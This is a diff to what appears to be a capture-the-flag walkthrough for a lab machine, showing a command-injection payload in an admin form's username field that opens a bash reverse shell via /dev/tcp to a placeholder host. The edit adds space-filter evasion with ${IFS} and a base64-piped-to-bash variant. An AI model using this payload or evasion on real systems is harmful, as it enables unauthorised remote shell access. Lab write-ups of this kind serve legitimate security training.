@@ -41,10 +41,10 @@ curl -s http://cozyhosting.htb/actuator/sessions
 With that cookie `/admin` opens, where the "Automatic SSH connection" form feeds `username` and `host` into `Runtime.exec` unsanitised:
 
 ```text
-username=;bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1';&host=x
+username=;bash${IFS}-c${IFS}'bash -i >& /dev/tcp/<LHOST>/4444 0>&1';&host=x
 ```
 
-`host` is regex-validated, the username is not: that is the flaw. Shell as the app user.
+`host` is regex-validated, the username is not: that is the flaw. The field **rejects spaces**, so rebuild them with `${IFS}` or send the command base64-encoded (`echo <b64>|base64 -d|bash`). Shell as the app user.
 
 ## Escalation
 
